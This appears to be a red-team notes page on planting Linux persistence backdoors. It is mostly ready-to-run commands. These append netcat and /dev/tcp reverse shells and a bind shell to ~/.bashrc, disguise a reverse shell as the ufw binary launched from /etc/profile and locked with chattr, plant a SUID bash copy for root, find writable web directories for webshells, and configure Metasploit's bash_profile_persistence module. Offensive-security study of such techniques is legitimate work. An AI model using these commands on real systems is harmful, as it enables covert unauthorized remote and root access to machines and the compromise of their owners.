# Backdoors

## 01 - Unix Shell

### 1.1 - Bashrc

- Reverse Shell

```
$ echo "nc -e /bin/bash <IP> <PORT> 2>/dev/null &" >> ~/.bashrc

$ echo "/bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1 &" >> ~/.bashrc
```

Even when the user logs out the shell will still be running.

```
$ echo "nohup <commands> &" >> ~/.bashrc
```

- Bind Shell

`$ echo "nc -e /bin/bash -lnvp 8080 &" >> ~/.bashrc`

### 1.2 - Bash Profiles

- Reverse Shell

```
$ sudo mv /usr/bin/ufw /tmp/ufw.bak

$ sudo echo "nc -e /bin/bash <IP> <PORT> 2>/dev/null &" > /usr/bin/ufw

$ sudo echo "/usr/bin/ufw &" >> /etc/profile

$ sudo echo "/usr/bin/ufw &" >> /etc/skel/.profile

$ sudo chmod +sss /usr/bin/ufw

$ chattr +i /etc/skel/.profile /etc/profile /usr/bin/ufw
```

### 1.3 - SUID

```
user@debian:~$ sudo su -
root@debian:/home/user# cp /bin/bash /tmp/junk
root@debian:/home/user# chmod +xs /tmp/junk
root@debian:/home/user# ls -l /tmp/junk
-rwsr-sr-x 1 root root 1190928 Oct 20 13:55 bash-copy
root@debian:/home/user# exit
user@debian:~$ /tmp/junk -p
root@debian:/home/user# whoami
root
```

### 1.4 - Webshell

- Find writable directories in the web root directory the drop a [[Tactics && Techniques && Procedures (TTPs) Phases/Initial Access/Callback Shells/Webshells/Webshells|webshell]].

`$ find /var/www/html -writable -type d 2>/dev/null`

### 1.5 - OpenSSH

TODO: Fill this info

## 02 - Metasploit

### 2.1 - Bash Profile

```
msf > use exploit/linux/local/bash_profile_persistence

msf exploit(linux/local/bash_profile_persistence) > options

Module options (exploit/linux/local/bash_profile_persistence):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   BASH_PROFILE  ~/.bashrc        yes       Target Bash profile location. Usually ~/.bashrc or ~/.bash_profile.
   PAYLOAD_DIR   /var/tmp/        yes       Directory to write persistent payload file.
   SESSION                        yes       The session to run this module on


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf exploit(linux/local/bash_profile_persistence) > set bash_profile </path/to/bash_rc_file>

msf exploit(linux/local/bash_profile_persistence) > set payload_dir </path/to/directory>

msf exploit(linux/local/bash_profile_persistence) > set lhost <IP>

msf exploit(linux/local/bash_profile_persistence) > set lport <PORT>

msf exploit(linux/local/bash_profile_persistence) > set session <session_id>

msf exploit(linux/local/bash_profile_persistence) > run
```

---
## References

- [Linux Backdoors and Where to Find Them](https://fahmifj.github.io/blog/linux-backdoors-and-where-to-find-them/)

- [Linode: Linux Red Team Persistence Techniques](https://www.linode.com/docs/guides/linux-red-team-persistence-techniques/)

- [Pikami: Backdooring OpenSSH Server](https://pikami.org/blog/backdooring-openssh-server/)

- [Infecting SSH Public Keys with Backdoors](https://blog.thc.org/infecting-ssh-public-keys-with-backdoors)